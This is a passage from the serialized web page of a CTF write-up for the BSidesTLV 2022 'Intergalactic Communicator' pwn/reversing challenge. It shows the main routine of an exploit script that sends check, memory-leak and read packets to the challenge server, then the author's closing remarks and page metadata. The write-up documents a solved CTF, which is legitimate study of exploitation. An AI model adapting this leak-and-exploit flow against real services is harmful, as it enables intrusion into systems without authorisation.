sock\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"main\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    conn \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" get_connection\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"server\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Checking for welcome message\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" check\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Sending leak payload\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" leak\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Checking if leaked pointers\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" __name__ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'__main__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    main\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"final-remarks\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#final-remarks\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Final remarks\"]}),`\n`,(0,n.jsx)(e.p,{children:`The challenge was statically compiled and stripped, which is just an artificial\nincrease in difficulty, in the end there was nothing in this challenge which made\nit worth the 500 points it was (in my opinion). But people couldn't solve it\n(probably also due to the reversing part), which makes the authors believe they\nactually made a hard challenge.`}),`\n`,(0,n.jsx)(e.p,{children:`This is not the case, this challenge was pretty easy once I had the packet sending\ndone, I just had to find a bunch of offsets and was done. Also the intended solution\nfor the pwn part was ridiculous, I don't want to bruteforce 16000 to 20000 attempts\njust to get ascii (and non-null) stack cookie & aslr base, that is not fun to exploit\non a remote system where every connection takes way longer than locally.`}),`\n`,(0,n.jsx)(e.p,{children:\"TLDR: pwn too easy, rev cancer.\"})]})}}var g=w;return y;})();\n;return Component;","toc":[{"value":"Intergalactic Communicator (500)","url":"#intergalactic-communicator-500","depth":2},{"value":"Part 1: Reversing","url":"#part-1-reversing","depth":2},{"value":"Header & checksum","url":"#header--checksum","depth":3},{"value":"API","url":"#api","depth":3},{"value":"Implementation","url":"#implementation","depth":3},{"value":"Part 2: Pwn","url":"#part-2-pwn","depth":2},{"value":"Links","url":"#links","depth":2},{"value":"Healthcheck","url":"#healthcheck","depth":2},{"value":"Final remarks","url":"#final-remarks","depth":2}],"frontMatter":{"readingTime":{"text":"16 min read","minutes":15.015,"time":900900,"words":3003},"slug":"bsidestlv-2022/intergalactic_communicator","fileName":"bsidestlv-2022/intergalactic_communicator.md","title":"BSidesTLV 2022 CTF  Intergalactic Communicator","date":"2022-06-30T00:00:00.000Z","draft":false,"authors":["thebadgod"],"tags":["BSidesTLV 2022","pwn","reverse","rc4"],"summary":"pwn too easy, rev cancer.","canonical":"https://spclr.ch/bsidestlv2022-writeups"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["thebadgod"],"fileName":"thebadgod.md","name":"TheBadGod","avatar":"https://www.gravatar.com/avatar/17fe95d3ab94df64d28ff20042e58df3?d=identicon&s=256","specialties":["Reverse","Pwn","Web"],"github":"https://github.com/TheBadGod/","twitter":"https://twitter.com/HodelAaron","web":"https://spclr.ch/","linkedin":"https://www.linkedin.com/in/aaron-hodel-17a77415a/","member":true,"description":"I do rev, also sometimes studying.","order":12,"date":null}],"prev":{"title":"BSidesTLV 2022 CTF  Code is Law","date":"2022-06-29T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["BSidesTLV 2022","Blockchain","Solidity","Smart Contract","Web3"],"summary":"Modify contract storage using hardhat_setStorageAt.","canonical":"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/code_is_law","slug":"bsidestlv-2022/code_is_law"},"next":{"title":"BSidesTLV 2022 CTF  SEV","date":"2022-07-01T00:00:00.000Z","draft":false,"authors":["radewoosh"],"tags":["BSidesTLV 2022","Crypto","ECC","Elliptic Curve"],"summary":"Steal secret key and get the flag.","slug":"bsidestlv-2022/sev"}},"__N_SSG":true}